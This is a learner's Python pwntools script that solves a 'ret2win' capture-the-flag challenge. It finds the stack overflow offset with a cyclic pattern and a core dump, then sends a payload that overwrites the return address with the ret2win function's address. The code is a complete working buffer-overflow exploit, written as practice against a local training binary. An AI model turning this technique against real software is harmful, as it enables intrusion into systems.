#!/usr/bin/python3

# While learning, I pretty much followed the example here: https://kavigihan.medium.com/rop-attacks-via-buffer-overflow-using-pwntools-part-1-a3a3fa6a483
# Credit to where it is due :)
# The idea here is to script the ENTIRE process: both finding and executing the ROP chain vuln

# Let's use pwntools for the first time (2021-12-04)
from pwn import *
import time

print("""
/*****
  Setting things up
*****/
""")
#context(arch="amd64") # Set context (Not necessary since we are on amd64)
ret2win = "./ret2win" # Grab challenge binary
elf = ELF(ret2win)    # Load it via pwntools as an ELF

# Step 1: Find the vuln
print("""
/*****
  Loop through the binary output
*****/
""")
p = process(ret2win) # Load the binary as a process
print(p.recvline())  # Do this seven times to get to the prompt
print(p.recvline())  # 2
print(p.recvline())  # 3
print(p.recvline())  # 4
print(p.recvline())  # 5
print(p.recvline())  # 6
print(p.recvline())  # 7

pattern = cyclic(1024) # Generate De Bruin pattern to find offset
p.sendline(pattern)    # Send the pattern

print("""
/*****
  Send the test payload
*****/
""")
print(p.recvline())                                  # Segfault
print("""
/*****
  Sleep to let the corefile create
*****/
""")
time.sleep(3)                                        # Sleep to let the core file generate
core = Coredump("./core")                            # Grab the corefile
seg_addr = int("0x" + hex(core.fault_addr)[10:], 16) # This is really what I needed to steel from the above link
offset = cyclic_find(seg_addr)                       # Grab the offset (this should be 40 for this challenge)
p.close()                                            # Stop the process (it should be stopped already)

# Step 2: Exploit the vuln
print("""
/*****
  Loop through the binary output
*/
""")
p = process(ret2win) # Load the binary as a process
print(p.recvline())  # Do this seven times to get to the prompt
print(p.recvline())  # 2
print(p.recvline())  # 3
print(p.recvline())  # 4
print(p.recvline())  # 5
print(p.recvline())  # 6
print(p.recvline())  # 7

target_addr = elf.symbols['ret2win']        # The address of the function we want to get to (only works after process is started so we don't only have offset)
payload = [ b"A"*offset, p64(target_addr) ] # Generate a payload by filling the offset and appending the target function address
print("""
/*****
  Send the real payload
*****/
""")
p.sendline(b"".join(payload))               # Send the payload
print(p.recvline())                         # Receive lines until the function we jumped to completes
print(p.recvline())                         # 2
print(p.recvline())                         # 3
p.close()                                   # End the process
